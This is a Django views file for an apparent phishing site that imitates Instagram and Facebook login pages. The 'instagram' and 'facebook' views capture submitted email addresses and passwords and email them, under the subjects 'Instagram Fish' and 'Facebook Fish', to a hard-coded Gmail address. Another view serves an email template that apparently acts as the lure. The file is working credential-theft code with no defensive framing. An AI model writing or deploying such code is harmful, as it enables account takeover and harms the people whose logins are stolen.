from django.shortcuts import render
from django.core.mail import send_mail

# Create your views here.
def home(reuqest):
    return render(reuqest, 'links_page/home.html')

def link_info_instagram(reuqest):
    return render(reuqest, 'links_page/link_info_instagram.html')

def link_info_facebook(request):
    return render(request, 'links_page/link_info_facebook.html')

def instagram(request):
    if request.method == 'POST':
        email = request.POST.get('email')
        password = request.POST.get('password')
        data = {
            'complaint': 'Instagram Fish',
            'password': password,
            'email': email,
        }
        message = '''
        Account: {}
        Password: {}
        '''.format(data['email'], data['password'])
        send_mail(data['complaint'], message, '', ['ensocio.mx@gmail.com'])

    return render(request, 'links_page/pages/instagram.html')

def facebook(request):
    if request.method == 'POST':
        email = request.POST.get('email')
        password = request.POST.get('password')
        data = {
            'complaint': 'Facebook Fish',
            'password': password,
            'email': email,
        }
        message = '''
        Account: {}
        Password: {}
        '''.format(data['email'], data['password'])
        send_mail(data['complaint'], message, '', ['ensocio.mx@gmail.com'])

    return render(request, 'links_page/pages/facebook.html')

def email_instagram(request):
    return render(request, 'links_page/email_templates/email_instagram.html')
